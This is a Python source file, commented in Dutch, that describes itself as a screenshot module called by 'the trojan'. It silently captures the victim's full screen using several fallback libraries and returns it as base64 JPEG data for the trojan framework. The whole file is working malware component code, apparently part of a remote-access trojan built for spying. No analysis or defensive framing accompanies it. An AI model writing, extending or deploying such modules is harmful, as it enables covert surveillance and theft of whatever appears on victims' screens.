"""
Screenshot Module
Maakt een screenshot van het huidige scherm
"""

import base64
import io
from datetime import datetime


def run(params):
    """
    Hoofdfunctie die wordt aangeroepen door de trojan
    params: dict met configuratie opties
    """
    resultaat = {
        "module": "screenshot",
        "timestamp": datetime.now().isoformat(),
        "data": {}
    }
    
    kwaliteit = params.get("kwaliteit", 50)  # JPEG kwaliteit
    
    try:
        # Probeer screenshot te maken
        screenshot_data = maak_screenshot(kwaliteit)
        
        if screenshot_data:
            resultaat["data"]["screenshot_base64"] = screenshot_data
            resultaat["data"]["formaat"] = "JPEG"
            resultaat["data"]["succes"] = True
            print("[+] Screenshot gemaakt")
        else:
            resultaat["data"]["succes"] = False
            resultaat["data"]["fout"] = "Kon screenshot niet maken"
            
    except Exception as e:
        resultaat["data"]["succes"] = False
        resultaat["data"]["fout"] = str(e)
        print(f"[!] Screenshot fout: {e}")
    
    return resultaat


def maak_screenshot(kwaliteit=50):
    """Maak screenshot en return als base64"""
    
    # Probeer verschillende libraries
    screenshot = probeer_pillow()
    
    if screenshot is None:
        screenshot = probeer_mss()
    
    if screenshot is None:
        screenshot = probeer_pyautogui()
    
    if screenshot is None:
        return None
    
    # Converteer naar base64 JPEG
    try:
        buffer = io.BytesIO()
        
        # Converteer naar RGB als nodig (voor JPEG)
        if screenshot.mode in ('RGBA', 'LA') or (screenshot.mode == 'P' and 'transparency' in screenshot.info):
            screenshot = screenshot.convert('RGB')
        
        screenshot.save(buffer, format='JPEG', quality=kwaliteit)
        img_bytes = buffer.getvalue()
        
        return base64.b64encode(img_bytes).decode('utf-8')
    except Exception as e:
        print(f"[!] Fout bij encoderen: {e}")
        return None


def probeer_pillow():
    """Probeer screenshot met Pillow/PIL"""
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        return screenshot
    except ImportError:
        return None
    except Exception:
        return None


def probeer_mss():
    """Probeer screenshot met mss library"""
    try:
        import mss
        from PIL import Image
        
        with mss.mss() as sct:
            # Pak eerste monitor (hele scherm)
            monitor = sct.monitors[1]  # 0 is alle monitors samen
            screenshot = sct.grab(monitor)
            
            # Converteer naar PIL Image
            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
            return img
    except ImportError:
        return None
    except Exception:
        return None


def probeer_pyautogui():
    """Probeer screenshot met pyautogui"""
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        return screenshot
    except ImportError:
        return None
    except Exception:
        return None


def krijg_scherm_info():
    """Haal scherm informatie op"""
    info = {}
    
    try:
        from PIL import ImageGrab
        screen = ImageGrab.grab()
        info["resolutie"] = f"{screen.width}x{screen.height}"
    except:
        pass
    
    return info
